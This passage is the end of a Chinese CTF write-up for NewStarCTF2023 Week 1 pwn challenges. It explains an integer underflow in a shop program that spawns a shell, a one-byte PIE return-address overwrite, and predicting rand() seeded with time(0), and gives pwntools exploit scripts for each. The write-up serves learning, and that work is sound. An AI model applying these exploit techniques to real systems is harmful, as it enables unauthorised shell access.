+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_17</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;nothing here&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mi">40u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">money</span> <span class="o">&gt;</span> <span class="mi">19</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">money</span> <span class="o">-=</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You buy a newstar&#39;s gift&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;That is the gift:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;What will happen when int transfer to unsigned int?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_17</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">money</span> <span class="o">&gt;</span> <span class="mi">39</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">money</span> <span class="o">-=</span> <span class="mi">40</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You buy a pwn write up&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;That is free after the match,haha&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Sorry,you don&#39;t have enough money&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mi">40u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">money</span> <span class="o">&gt;</span> <span class="mi">9998</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">money</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;How do you buy it?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Sorry,you don&#39;t have enough money&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mi">40u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里发现，总共可以用money购买三种商品，我们感兴趣的肯定就是shell。也就是说，只要能买第三项就可以直接getshell。我们肯定不回去赚9999的（当然似乎也可以）。</p>
+<p>这里有个很重要的发现，在第一个gift处提示：<strong>What will happen when int transfer to unsigned int?</strong>。我们发现每次检查金额的时候，都会将int类型的money强制转化为unsigned int。这里直接想到整数溢出，也就是将money变为负的即可。但是仅凭shop只能将money变为0。我们需要再找一个“扣钱”的步骤。</p>
+<p>于是在main函数中，我们发现了一个dont_cry函数：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112333104.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112333104.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112333104.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112333104.png?size=large 2x" sizes="auto" data-title="image-20231004112333104" data-alt="image-20231004112333104" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>发现，这里可以无条件的将money扣除50，但是有且仅有一次机会。这足够了。</p>
+<p>首先我们确定money初始值是100（64h），那么我们在shop购买两次writeup然后直接dont_cry就可以溢出了。</p>
+<p>连接靶机，依次输入：</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1
+</span></span><span class="line"><span class="cl">2
+</span></span><span class="line"><span class="cl">1
+</span></span><span class="line"><span class="cl">2
+</span></span><span class="line"><span class="cl">3
+</span></span><span class="line"><span class="cl">1
+</span></span><span class="line"><span class="cl">3
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">cat flag</span></span></code></pre></td></tr></table>
+</div>
+</div><p>即可拿到flag</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112812375.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112812375.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112812375.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112812375.png?size=large 2x" sizes="auto" data-title="image-20231004112812375" data-alt="image-20231004112812375" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="p1eee">p1eee</h1>
+<p>应该是绕过pie保护，其实是pie并不会将地址的低12位（也就是1.5个字节随机化）</p>
+<p>根据题目，发现后门函数和实际ret的值只差了最后一个字节（改为\x69即可）</p>
+<p>exp如下，（其实直接输入0x28个a加上一个i就可以getshell，因为最后\x69是可见字符i）</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pie!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x28</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x69</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="random">random</h1>
+<p>通过ctype库加载libc.so库，使用同样的time(0)达到产生同样随机数的效果，然后system($0)同样可以getshell</p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">from LibcSearcher import *
+</span></span><span class="line"><span class="cl">from ctypes import *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">file_name = &#39;./random&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">debug = 0
+</span></span><span class="line"><span class="cl">if debug:
+</span></span><span class="line"><span class="cl">	io = remote(&#39;node4.buuoj.cn&#39;,26238)
+</span></span><span class="line"><span class="cl">else:
+</span></span><span class="line"><span class="cl">	io = process(file_name)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">elf = ELF(file_name)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">context(arch = elf.arch,log_level = &#39;debug&#39;,os = &#39;linux&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def dbg():
+</span></span><span class="line"><span class="cl">	gdb.attach(io)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">libc = cdll.LoadLibrary(&#39;libc.so.6&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">libc.srand(libc.time(0))
+</span></span><span class="line"><span class="cl">a = libc.random()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">io.sendlineafter(&#39;number?\n&#39;,str(a))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">io.interactive()</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-10-03 11:00:40">更新于 2023-10-03&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/articles/2023/10/newstarctf2023-week1-pwn/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/10/newstarctf2023-week1-pwn/" data-title="NewStarCTF2023-Week1-Pwn" data-via="a1extang" data-hashtags="CTF,Pwn,WriteUp"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/10/newstarctf2023-week1-pwn/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/10/newstarctf2023-week1-pwn/" data-title="NewStarCTF2023-Week1-Pwn"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/pwn/' class="post-tag">Pwn</a><a href='/tags/writeup/' class="post-tag">WriteUp</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/articles/2023/10/newstarctf2023-week1-web/" class="post-nav-item" rel="prev" title="NewStarCTF2023-Week1-Web"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>NewStarCTF2023-Week1-Web</a>
+      <a href="/articles/2023/10/newstarctf2023-week1-misc/" class="post-nav-item" rel="next" title="NewStarCTF2023-Week1-Misc">NewStarCTF2023-Week1-Misc<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
